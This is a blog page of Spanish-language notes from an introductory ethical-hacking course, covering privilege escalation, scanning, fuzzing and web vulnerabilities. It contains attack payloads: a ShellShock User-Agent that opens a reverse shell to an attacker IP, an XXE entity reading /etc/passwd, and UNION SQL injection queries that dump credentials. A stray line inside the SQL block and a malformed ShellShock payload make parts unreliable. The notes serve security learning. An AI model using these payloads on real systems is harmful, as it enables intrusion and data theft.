<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Apuntes del curso Introducción al hacking - Ciberseguridad y Hacking Ético</title>
<meta name="description" content="En este post están los apuntes que considero importante, también algunos recordatorios">



<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="Ciberseguridad y Hacking Ético">
<meta property="og:title" content="Apuntes del curso Introducción al hacking">
<meta property="og:url" content="http://localhost:4000/Apuntes-introducci%C3%B3n-al-hacking/">


  <meta property="og:description" content="En este post están los apuntes que considero importante, también algunos recordatorios">







  <meta property="article:published_time" content="2021-10-11T00:00:00-05:00">





  

  


<link rel="canonical" href="http://localhost:4000/Apuntes-introducci%C3%B3n-al-hacking/">







  <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "Person",
      "name": "ARgoN",
      "url": "http://localhost:4000",
      "sameAs": null
    }
  </script>







<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Ciberseguridad y Hacking Ético Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE ]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
                
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/" >Home</a>
            </li><li class="masthead__menu-item">
              <a href="/year-archive/" >Artículos</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/" >Categorías</a>
            </li><li class="masthead__menu-item">
              <a href="/tags/" >Etiquetas</a>
            </li><li class="masthead__menu-item">
              <a href="/buscador/" >Buscador</a>
            </li><li class="masthead__menu-item">
              <a href="/about/" >Contacto</a>
            </li></ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>
    

    <div class="initial-content">
      


  
    



<nav class="breadcrumbs">
  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
    
    
    
      
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
          <meta itemprop="position" content="1" />
        </li>
        <span class="sep">/</span>
      
      
        <li class="current">Apuntes del curso Introducción al hacking</li>
      
    
  </ol>
</nav>

  


<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      

      
        <img src="/assets/images/avatar.png" alt="ARgoN" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">ARgoN</h3>
    
    
      <p class="author__bio" itemprop="description">
        CyberSecurity Analyst / CPHE / CHEE
      </p>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      

      

      

      

      

      

      
        <li>
          <a href="https://www.facebook.com/nicolle.lovelace.9" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-facebook-square" aria-hidden="true"></i> Facebook
          </a>
        </li>
      

      

      

      

      

      

      

      
        <li>
          <a href="https://github.com/Dname24" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
          </a>
        </li>
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>


  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Apuntes del curso Introducción al hacking">
    <meta itemprop="description" content="En este post están los apuntes que considero importante, también algunos recordatorios">
    <meta itemprop="datePublished" content="October 11, 2021">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">Apuntes del curso Introducción al hacking
</h1>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
        <p class="page__meta">
          
            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2021-10-11T00:00:00-05:00">October 11, 2021 </time>&emsp;
          
          
        </p>
        <p><img src="/assets/images/certifados/Introduccion-al-hacking.jpeg" alt="" /></p>

<h1 id="conceptos-básicos">Conceptos básicos</h1>
<h2 id="asignación-e-interpretación-de-permisos">Asignación e Interpretación de permisos</h2>

<p>Para interpretar permisos podemos verlos con el comando <strong>ls -l</strong> el cual nos muestra los permisos que tienen las carpetas o 
archivos y tendremos lo siguiente:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
d rwx r-xr-x *****   *****   0 B Fri Nov 19 13:43:46 2021  *****


d: directorio
   rwx           rwx       rwx
Propietario     Grupo     Otros
    P             G         O



   rwx           r-x
   ***         solo se puede leer
                y se puede atravesar


r: leer
w: escribir
x:
  f: ejecutable
  d: se puede atravesar como un (cd "directorio")


</code></pre></div></div>

<p>También podemos conocerlo de manera numerica de la siguiente forma:</p>

<p><strong>r = 2^2 = 4</strong></p>

<p><strong>w = 2^1 = 2</strong></p>

<p><strong>x = 2^0 = 1</strong></p>

<p>así como también podemos cambiar esos permisos con <strong>chmod</strong> ya sea de las siguientes maneras:</p>

<table>
  <tbody>
    <tr>
      <td><em>chmod g+w “directorio”</em></td>
      <td><em>chmod o-w “directorio”</em></td>
    </tr>
    <tr>
      <td><em>chmod 774 “directorio”</em></td>
      <td><em>chmod 751 “directorio”</em></td>
    </tr>
  </tbody>
</table>

<div>
<p style="text-align:center;">
<img src="https://mural.uv.es/oshuso/p1.jpg" width="500px" />
</p>
</div>

<p><strong><em>Permisos STICKY BIT</em></strong></p>

<p>Cuando se le asigna a un directorio, significa que los elementos que hay en ese directorio solo 
pueden ser renombrados o borrados por su propietario o bien por root. El resto de usuarios que 
tengan permisos de lectura y escritura, los podrán leer y modificar, pero no borrar.</p>

<p><em>chmod 1775 “directorio”</em></p>

<p><strong><em>Permisos SUID o SGID</em></strong></p>

<p>Cuando se activa el bit SUID sobre un fichero significa que el 
que lo ejecute va a tener los mismos permisos que el que creó el archivo.</p>

<p><em>chmod 4775 “directorio”</em></p>

<p>Con toda esta información podemos abusar y explotar privilegios</p>

<h2 id="explotación-de-tareas-cron">Explotación de tareas Cron</h2>

<p>Las tareas Cron son las que se ejecutan en intervalos regulares de tiempo <em>en segundo plano</em>, su estructura es la
siguiente:</p>

<div>
<p style="text-align:center;">
<img src="https://www.redeszone.net/app/uploads-redeszone.net/2017/01/Linux-cron-crontab-a%C3%B1adir-tareas-periodicas.png" width="500px" />
</p>
</div>

<p>Con esto podemos ver si alguna tarea se está ejecutando en segundo plano y podemos conseguir dominio root con conocimientos básicos
También podemos crear un script en bash para automatizar la tarea y buscar qué se está ejecutando en segundo plano
por ejemplo este código básico:</p>

<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="c">#!/bin/bash</span>

<span class="nv">old_process</span><span class="o">=</span> <span class="si">$(</span>ps <span class="nt">-eo</span> <span class="nb">command</span><span class="si">)</span>

<span class="k">while </span><span class="nb">true</span><span class="p">;</span> <span class="k">do
     </span><span class="nv">new_process</span><span class="o">=</span> <span class="si">$(</span>ps <span class="nt">-eo</span> <span class="nb">command</span><span class="si">)</span>
     diff &lt;<span class="o">(</span><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$old_process</span><span class="s2">"</span><span class="o">)</span> &lt;<span class="o">(</span><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$new_process</span><span class="s2">"</span><span class="o">)</span> 
     | <span class="nb">grep</span> <span class="s2">"[</span><span class="se">\&gt;\&lt;</span><span class="s2">]"</span> | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s2">"/"</span>
     <span class="nv">old_process</span><span class="o">=</span> <span class="nv">$new_process</span>
<span class="k">done</span></code></pre></figure>

<p>Después de ejecutarlo vemos que permisos tienen las carpetas o archivos, si encontramos un permiso SUID podemos conseguir el “root”
como lo vimos antes.</p>

<h2 id="explotación-de-un-path-hijacking">Explotación de un PATH Hijacking</h2>

<p>Consiste en suplantar una librería <strong>$PATH</strong>, que un binario esté usando para inyectar código de forma que 
el atacante escale privilegios y/u obtenga un shell en el sistema o consiga root.
Para aplicar esto de manera sencilla primero vemos el contenido de la variable <strong>$PATH</strong> con el comando <strong>echo $PATH</strong>
y nos da como respuesta una ruta, podemos crear un archivo .sh para poder introducirlo como ataques por inyección</p>

<p>Debemos intuir si un proceso se está ejecutando de forma absoluta o relativa, teniendo en cuenta que esta última 
es de riesgo ya que podemos alterar el flujo de comandos.</p>

<p>El procedimiento para la explotación:</p>

<p>1.-Ubicar el programa</p>

<p>2.-Listar los permisos de la ubicación en la que se encuentra</p>

<p>3.-Leer el contenido del programa</p>

<p>4.-Crear un archivo para suplantar una de las librerías del programa</p>

<p>5.-Inyectar el código deseado</p>

<p>Podemos usar esta web para ayudarnos <a href="https://gtfobins.github.io/">GTFOBins</a></p>

<h2 id="herramienta-nmap">Herramienta NMAP</h2>

<p>Existe la herramienta Nmap que se usa para enumerar puertos, tenemos algunos parametros como:</p>

<p><strong>-v</strong>   :Significa «verbose», por lo que se nos indica lo que está haciendo el análisis al detalle–&gt;</p>

<p><strong>-n</strong>  :Quita la resolución DNS</p>

<p><strong>-p-</strong> :Quiere decir que se escaneará todos los puertos</p>

<p><strong>-sS</strong> :Este comando determina si el puerto objetivo está escuchando</p>

<p><strong>-sV</strong> :Para detectar las versiones de los servicios</p>

<p><strong>-sC</strong> :Sirve para realizar un analisis de secuencia de comandos. Es equivalente a –script = default</p>

<p><strong>-Pn</strong> :Si un usuario no cuenta con privilegios elevados sobre paquetes, este es el comando para escanear con la opción «conexión TCP»</p>

<p><strong>-O</strong>  :Detecta el sistema operativo</p>

<p><strong>-A</strong>  :Escaneo de Sistema Operativo y servicios</p>

<h2 id="escaneo-de-servicios-de-banner-ligero">Escaneo de servicios de banner ligero</h2>

<p>Es mucho menos ruidoso que un escaneo agresivo y permite obtener datos sin llamar demasiado la atención, 
lo que aporta una clara ventaja.</p>

<figure class="highlight"><pre><code class="language-shell" data-lang="shell">nmap <span class="nt">-sV</span> <span class="nt">--version-intensity</span> 0 <span class="o">{</span>IP<span class="o">}</span></code></pre></figure>

<p>también podemos usar los scripts por defecto que vienen con nmap, para buscar vulnerabilidades, etc.
Lo usamos ejecutando este código:</p>

<figure class="highlight"><pre><code class="language-shell" data-lang="shell">nmap <span class="nt">-sV</span> <span class="nt">-p</span><span class="o">{</span>ports<span class="o">}</span> <span class="o">{</span>IP<span class="o">}</span> <span class="nt">--scripts</span> <span class="s2">""</span></code></pre></figure>

<p>para saber los nombres de los scripts los podemos filtrar</p>

<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="k">function </span>scripts_nmap<span class="o">(){</span>
        locate .nse | xargs <span class="nb">grep</span> <span class="s2">"categories"</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'".*?"'</span> | <span class="nb">sort</span> <span class="nt">-u</span>
<span class="o">}</span></code></pre></figure>

<ul>
  <li><em>Haciendo Fuzzing para encontrar directorios</em></li>
</ul>

<p>Podremos hacer fuzzing con los scripts de nmap, pero tener en cuenta que el script solo te enlista algunos directorios 
por eso su peso es menor y no hace tanta bulla como las listas encontradas en el siguiente directorio:</p>

<p><code class="language-plaintext highlighter-rouge">/usr/share/wordlists/dirbuster/</code></p>

<p>Usamos este comando para para el fuzzing con nmap</p>

<figure class="highlight"><pre><code class="language-shell" data-lang="shell">nmap <span class="nt">-p80</span> <span class="o">{</span>IP<span class="o">}</span>  <span class="nt">--script</span> http-enum <span class="nt">-oN</span> webScan</code></pre></figure>

<p>Si eres curioso puedes ver como se intercepta el trafico que se envía a las páginas para encontrar esos directorios con Tshark 
o Wireshark; pero también existen otras herramientas para encontrar directorios como:</p>

<ul>
  <li><em>Wfuzz</em></li>
</ul>

<figure class="highlight"><pre><code class="language-shell" data-lang="shell">wfuzz <span class="nt">-c</span> <span class="nt">-L</span> <span class="nt">-t</span> 400 <span class="nt">--hc</span><span class="o">=</span>400 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt  <span class="o">{</span>IP<span class="o">}</span>/FUZZ</code></pre></figure>

<p><strong>-c</strong></p>

<p>Es para que lo muestre en colores(es opcional)</p>

<p><strong>-L</strong></p>

<p>Es un follow redirect</p>

<p><strong>–hc= 404</strong></p>

<p>Es para que oculte aquellos directorios que muestran error 404 NOT FOUND</p>

<p><strong>-t 400</strong></p>

<p>Para intentar con 400 directorios de la lista, se puede manipular</p>

<p>Para agregar extensiones a los directorios nos creamos un .txt con los siguientes nombres dentro “php, html, txt” y lo
agregamos a nuestro comando Wfuzz de la siguiente manera.</p>

<figure class="highlight"><pre><code class="language-shell" data-lang="shell">wfuzz <span class="nt">-c</span> <span class="nt">-L</span> <span class="nt">-t</span> 400 <span class="nt">--hc</span><span class="o">=</span>400 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt <span class="nt">-w</span> extensiones.txt <span class="o">{</span>IP<span class="o">}</span>/FUZZ/FUZ2Z</code></pre></figure>

<ul>
  <li><em>Dirbuster</em></li>
</ul>

<p>Esta manera es gráfica asi que no creo que haya problemas y que no sea necesario explicar</p>

<ul>
  <li><em>Dirb</em></li>
</ul>

<figure class="highlight"><pre><code class="language-shell" data-lang="shell">dirb <span class="o">{</span>IP<span class="o">}</span></code></pre></figure>

<ul>
  <li><em>GoBuster</em></li>
</ul>

<figure class="highlight"><pre><code class="language-shell" data-lang="shell">gobuster <span class="nb">dir</span> <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt <span class="nt">--url</span> <span class="o">{</span>IP<span class="o">}</span></code></pre></figure>

<ul>
  <li><em>DirSearch</em></li>
</ul>

<p>Este se debe descargar desde su git</p>

<figure class="highlight"><pre><code class="language-shell" data-lang="shell">./dirsearch.py <span class="nt">-u</span> <span class="o">{</span>ip<span class="o">}</span> <span class="nt">-E</span> <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt </code></pre></figure>

<h2 id="técnicas-de-enumeración-bajo-un-servidor-web">Técnicas de enumeración bajo un servidor web</h2>

<ul>
  <li><em>wafw00f</em></li>
</ul>

<p>Esta herramienta ayuda a buscar si la página web utiliza un WAF(Web Application Firewall)</p>

<figure class="highlight"><pre><code class="language-shell" data-lang="shell">wafw00f <span class="o">{</span>IP<span class="o">}</span></code></pre></figure>

<h2 id="uso-de-burpsuite">Uso de BurpSuite</h2>

<p>Es una app que sirve de intermediario entre la página y la peticiones que se envía, podemos leer cómo se usa en este link</p>

<p><a href="https://www.manusoft.es/tutorial-burp-suite/">BurpSuite</a></p>

<p>Usando las herramientas del mismo BurpSuite tenemos el “repeater” que nos permite tener la respuesta de la 
página en la misma app</p>

<p><a href="https://portswigger.net/burp/documentation/desktop/tools/proxy/getting-started">Repeater</a></p>

<p>Otra de las herramientas interesantes de BurpSuite es “intruder” que nos permite automatizar ataques añadiendo payloads 
a los comandos que introducimos a la pagg</p>

<p><a href="https://portswigger.net/burp/documentation/desktop/tools/intruder/using">Intruder</a></p>

<h1 id="tipos-de-vulnerabilidades">Tipos de Vulnerabilidades</h1>

<h2 id="local-file-intrusion-lfi">Local File Intrusion (LFI)</h2>

<p>Esta técnica consiste en incluir ficheros locales, es decir, archivos que se encuentran en el mismo servidor de la web con este tipo
de fallo -a diferencia de Remote File Inclusión o inclusión de archivos remotos (RFI) que incluye archivos alojados en otros 
servidores. Esto se produce como consecuencia de un fallo en la programación de la página, filtrando inadecuadamente lo que se 
incluye al usar funciones en PHP para incluir archivos.</p>

<p><a href="https://www.welivesecurity.com/la-es/2015/01/12/como-funciona-vulnerabilidad-local-file-inclusion/">LFI</a></p>

<h2 id="log-poisoning---lfi-to-rce">Log Poisoning - LFI to RCE</h2>

<p>Cuando uno encuentra una vulnerabilida LFI lo mejor sería convertirla a RCE(Remote Code Execution) 
Entonces, hay una variedad de trucos diferentes para convertir su LFI en RCE, como por ejemplo:</p>

<p>1.- Using file upload forms/functions</p>

<p>2.- Using the PHP wrapper expect://command</p>

<p>3.- Using the PHP wrapper php://file</p>

<p>4.- Using the PHP wrapper php://filter</p>

<p>5.- Using PHP input:// stream</p>

<p>6.- Using data://text/plain;base64,command</p>

<p>7.- Using /proc/self/environ</p>

<p>8.- Using /proc/self/fd</p>

<p>9.- Using log files with controllable input like:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    /var/log/apache/access.log
    /var/log/apache/error.log
    /var/log/vsftpd.log
    /var/log/sshd.log
    /var/log/mail
</code></pre></div></div>

<h2 id="remote-file-inclusion-rfi">Remote File Inclusion RFI</h2>

<p>Esta vulnerabilidad consiste en subir archivos a una página desde la de nuestro servidor compartido por el puerto 80.
Abrimos nuestro servidor de la siguiente manera:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    sudo python3 -m http.server 80
</code></pre></div></div>

<p>Y luego procedemos a continuar con la vulnerabulidad, la podemos buscar directamente desde searchexploit</p>

<h2 id="vulnerabilidad-html-injection-y-xss">Vulnerabilidad HTML Injection y XSS</h2>

<p>Cross-site scripting (XSS) es un ataque de inyección de código que permite a un atacante ejecutar JavaScript 
malicioso en el navegador de otro usuario, este ataca a otros usuarios que se conectan a dicha página web, 
y los ataca en busca de varias cosas:</p>

<p>secuestrarles la sesión, robarles la contraseña o cualquier otra 
información que considere de interés.</p>

<ul>
  <li><em>Cross Site Scripting persistente</em></li>
</ul>

<p>Si el código que hemos insertado se queda almacenado en el servidor, por ejemplo formando parte de una contribución en un foro, 
el ataque se dice que es persistente. Cualquier usuario que entre a leer dicha contribución leerá el texto inocente 
pero probablemente no así el código inyectado, que sin embargo sí será interpretado por el navegador del visitante, 
ejecutando las instrucciones que se haya definido.</p>

<p>Estas acciones pueden ser variadas, y dependerá del tipo de navegador, de sus vulnerabilidades inherentes, 
así como también de las de otros programas que tenga instalados, el Adobe Flash Player por ejemplo, que se ejecuten 
como el atacante tiene previsto. Para él es por tanto una ruleta de la suerte. 
No puede predecir el usuario que va a caer en la trampa.</p>

<ul>
  <li><em>Cross Site Scripting reflejado</em></li>
</ul>

<p>Pero si el código que insertamos no se queda almacenado en la web, sino que va embebido dentro de un enlace que se hace 
llegar de algún modo a la víctima para que pinche en él, se dice que este tipo de ataque es reflejado. 
Se llama así porque, si finalmente la víctima pincha en el enlace, el navegador le llevará a la página en cuestión, 
que normalmente es un sitio legal donde el usuario tiene cuenta abierta, y a continuación ejecutará el código embebido, 
el cual intentará robarle la «cookie» de la sesión, o los datos que introduzca en el formulario, o incluso podrá desencadenar 
acciones más sofisticadas en su PC. Pero la característica diferencial con el anterior ataque es que en este caso 
en el servidor web no queda almacenado nada.</p>

<ul>
  <li><em>¿Cómo saber si un sitio web tiene esta vulnerabilidad?</em></li>
</ul>

<p>Si en un sitio que ofrece búsquedas por palabras clave, en lugar de usar ese campo para buscar, escribimos lo siguiente:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> &lt;script type = ‘text / javascript’&gt; alert (‘soy vulnerable a XSS reflejado’); &lt;/ script&gt;  
</code></pre></div></div>

<p>le damos a buscar y, … voilà, entonces aparece un «pop up» con el mensaje «soy vulnerable a XSS reflejado», ¡bingo!: 
este sitio tiene la vulnerabilidad XSS reflejado.</p>

<h2 id="vulnerabilidad-cross-site-request-forgery-csrf">Vulnerabilidad Cross-Site Request Forgery (CSRF)</h2>

<p>Las tres variantes del CSRF que se perpetúan con mayor frecuencia son las siguientes: 
la más empleada consiste en colar una URL, dicha URL se esconde en una página web externa o en un correo electrónico. 
El acceso a esta URL desencadena la solicitud HTTP y por norma general, el usuario sí puede ver esta URL si presta atención, 
no obstante, el origen de la URL se puede ocultar mediante ingeniería social y la técnica de spoofing.</p>

<h2 id="vulnerabilidad-server-side-request-forgery-ssrf">Vulnerabilidad Server-Side Request Forgery (SSRF)</h2>

<p>Las vulnerabilidades SSRF (Server Side Request Forgery) y los ataques de XSPA (Cross Site Port Attacks) son dos fallos de seguridadque van casi siempre de la mano. Los bugs de SSRF se producen en aplicaciones web inseguras que permiten a un atacante forzar al 
servidor web a realizar peticiones desde dentro del sistema hacia el exterior. Usando esas conexiones, los ataques de XSPA tratan 
de conocer, en base a las respuestas obtenidas, la lista de puertos que se encuentran abiertos o por el contrario cerrados en el 
servidor al que se fuerza la conexión.</p>

<h2 id="sql-injection">SQL Injection</h2>

<ul>
  <li><em>SQLmap</em></li>
</ul>

<p>Esta herramienta automatiza las inyecciones SQL y para su uso podemos leerlo por aquí</p>

<p><a href="https://www.solvetic.com/tutoriales/article/1615-sqlmap-herramienta-de-inyecci%C3%B3n-de-sql-y-ethical-hacking-de-bases-de-datos/#:~:text=Esta%20herramienta%20sirve%20para%20testear,de%20una%20base%20de%20datos.">SQLmap</a></p>

<ul>
  <li><em>Manera manual</em></li>
</ul>

<p>Para entender como funciona la vulnerabilidad debemos intentarlo por nuestra cuenta, primero nos creamos una base de datos
para jugar</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>service mysql start
mysql <span class="nt">-uroot</span>
create table Tabla1<span class="o">(</span><span class="nb">id </span>int<span class="o">(</span>2<span class="o">)</span>, username varchar<span class="o">(</span>32<span class="o">)</span>, password<span class="o">(</span>32<span class="o">))</span><span class="p">;</span>
??? desde aquí hasta ???FIN las líneas pueden haber sido insertadas/borradas
insert into Tabla1<span class="o">(</span><span class="nb">id</span>, username, password<span class="o">)</span> values <span class="o">(</span>1, <span class="s2">"username"</span>, <span class="s2">"password"</span><span class="o">)</span><span class="p">;</span>
<span class="k">select</span> <span class="k">*</span> from Tabla1<span class="p">;</span>
<span class="k">select</span> <span class="k">*</span> from Tabla1 where <span class="nb">id</span> <span class="o">=</span> 1<span class="p">;</span> <span class="c">#Selecciona los datos con la id que pongas</span>
<span class="k">select</span> <span class="k">*</span> from Tabla1 where <span class="nb">id</span> <span class="o">=</span> 1 order by 100<span class="p">;</span><span class="nt">--</span> -<span class="p">;</span> <span class="c">#Hace un ordenamiento de datos en base a la columna 100</span>
<span class="k">select</span> <span class="k">*</span> from Tabla1 where <span class="nb">id</span> <span class="o">=</span> 1 union <span class="k">select </span>1,2,3,4<span class="p">;</span><span class="nt">--</span> -<span class="p">;</span> <span class="c">#Donde los numeros 1,2,3,4 pueden ser reemplazados por código</span>
<span class="k">select</span> <span class="k">*</span> from Tabla1 where <span class="nb">id</span> <span class="o">=</span> 1 union <span class="k">select</span> @@version, database<span class="o">()</span>, user<span class="o">()</span>, load_file<span class="o">(</span><span class="s1">'/etc/passwd'</span><span class="o">)</span><span class="p">;</span>
</code></pre></div></div>
<p>En el código anterior vemos distintos parametros</p>

<p><strong>@@version</strong> : Muestra la versión de la base de datos</p>

<p><strong>database()</strong> : Muestra la base de datos que se está usando</p>

<p><strong>user()</strong> : Nombra el usuario que usa la base de datos</p>

<p><strong>load_file(‘’)</strong> : Carga un archivo que se coloque en las comillas</p>

<p>Para listar la base de datos de manera alternativa podemos usar el siguiente código:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="k">*</span> from Tabla1 where <span class="nb">id</span><span class="o">=</span> 1 union <span class="k">select </span>1,schema_name,3,4 from information_schema.schemata
</code></pre></div></div>

<p>Para listar las tablas de una base de dato de manera alternativa usamos el siguiente código:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="k">*</span> from Tabla1 where <span class="nb">id</span><span class="o">=</span> 1 union <span class="k">select </span>1,table_name,3,4 from information_schema.tables where table_schema <span class="o">=</span> <span class="s1">'Table1'</span><span class="p">;</span><span class="nt">--</span> -<span class="p">;</span>
</code></pre></div></div>

<p>Para listar las columnas el siguiente código:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="k">*</span> from Tabla1 where <span class="nb">id</span><span class="o">=</span>1 union <span class="k">select </span>1, column_name,3,4 from information_schema.columns where <span class="nv">table_schema</span><span class="o">=</span><span class="s1">'Table1'</span> and <span class="nv">table_name</span><span class="o">=</span><span class="s1">'Nombre_de_la_tabla'</span> 
</code></pre></div></div>

<p>Para poder listar los datos que ya sabemos que la base de datos tiene podemos usar el siguiente código:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="k">*</span> from Tabla1 where <span class="nb">id</span><span class="o">=</span>1 union <span class="k">select </span>1, concat<span class="o">(</span>username,0x3a,password<span class="o">)</span>,3,4 from Tabla1.<span class="s1">'Nombre_de_la_tabla'</span>
</code></pre></div></div>

<h2 id="vulnerabilidad-padding-oracle-attack---padbuster">Vulnerabilidad Padding Oracle Attack - Padbuster</h2>

<p>Esta vulnerabilidad no solo se aplica en las páginas web si no en cualquiera que utilice un algoritmo de cifrado de bloques de longitud variable (es decir que necesita usar relleno o padding) y son vulnerables.</p>

<p><a href="https://www.hackplayers.com/2018/10/explotar-padding-oracle-para-obtener-clave.html">Explotar padding oracle para obtener claves de cifrado</a></p>

<ul>
  <li>Padding Oracle Attack - BurpSuite Bit Flipper Attack</li>
</ul>

<p>Para este tipo de ataques utilizamos el burpsuit, mandamos el código fuente al intruder después cargamos un payload a la cookie y marcamos un ataque de tipo Bit Flipper y lo dejamos correr.
Con esta función automatiza el ataque y te envía la cookie correcta que buscas.</p>

<h2 id="vulnerabilidad-shellshock">Vulnerabilidad ShellShock</h2>

<p>Este tipo de ataque funciona cuando las cabeceras terminan en .cgi, .pl, .sh e incluso pueden ser otras extensiones, algunos vectores vulnerables son:</p>

<ul>
  <li>Servidor Web CGI</li>
  <li>Servidor OpenSSH</li>
  <li>Clientes DHCP</li>
  <li>Servidor QMail</li>
  <li>Shell restringida IBM HMC</li>
</ul>

<p>Para poder hacer un ataque cambiamos el <em>User Agent</em> con BurpSuite y abrimos un puerto de escucha con nc, recargamos la página y se recarga la petición.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User-Agent: <span class="o">()</span> <span class="o">{</span> :<span class="p">;</span> <span class="o">}</span><span class="p">;</span> /bin/bash <span class="nt">-i</span> /dev/tcp/<span class="o">{</span>IP<span class="o">}</span>/443 
</code></pre></div></div>

<p><a href="https://blog.cloudflare.com/inside-shellshock/">ShellShock</a></p>

<h2 id="vulnerabilidad-xml-external-entity-injection-xxe">Vulnerabilidad XML External Entity Injection (XXE)</h2>

<p>XXE se refiere a un ataque de falsificación de solicitud de servidor (SSRF), mediante el cual un atacante es capaz de causar:</p>

<ul>
  <li>Denegación de servicio (DDoS)</li>
  <li>Acceso a archivos y servicios locales o remotos</li>
</ul>

<p>Una vulnerabilidad de XXE consiste en una inyección que se aprovecha de la mala configuración del intérprete XML permitiendo incluir entidades externas, este ataque se realiza contra una aplicación que interpreta lenguaje XML en sus parámetros.
Para identificar esta vulnerabilidad podemos interceptar la página con BurpSuite, si el Content Types es de tipo text/xml, application/xml estos son indicadores que nos permiten verificar, cómo los parámetros son enviados por el request a un intérprete de XML, adicionalmente también existe puede darse al parsear archivos como JSON a XML e inyectar el payload en el sitio web.
Para ver si la web tiene este tipo de vulnerabilidad podemos intentar lo que se presenta en la siguiente página:</p>

<p><a href="https://backtrackacademy.com/articulo/explorando-la-vulnerabilidad-xxe-xml-external-entity">XXE</a></p>

<p>Inyectamos el código en la página, ya sea en el url o si es que se puede subiendo un archivo malicioso con el sgte código para listar usuarios</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;<span class="o">!</span>DOCTYPE foo  <span class="o">[</span>&lt;<span class="o">!</span>ENTITY bar SYSTEM <span class="s2">"file:///etc/passwd"</span><span class="o">&gt;]&gt;</span> &lt;foo&gt;&amp;bar<span class="p">;</span>&lt;/foo&gt;
</code></pre></div></div>

<p><a href="https://underc0de.org/foro/bugs-y-exploits/entendiendo-y-explotando-xxe-(external-xml-entities)/">Entendiendo y Explotando XXE</a></p>

<h2 id="vulnerabilidad-domain-zone-transfer">Vulnerabilidad Domain Zone Transfer</h2>

<p>Las Transferencias de zona dns, a veces llamadas AXFR por el tipo de solicitud, es un tipo de transacción de DNS. Es uno de varios mecanismos disponibles para administradores para replicar bases de datos DNS a través de un conjunto de servidores DNS. La transferencia puede hacerse de dos formas: completa (AXFR) o incremental (IXFR)</p>

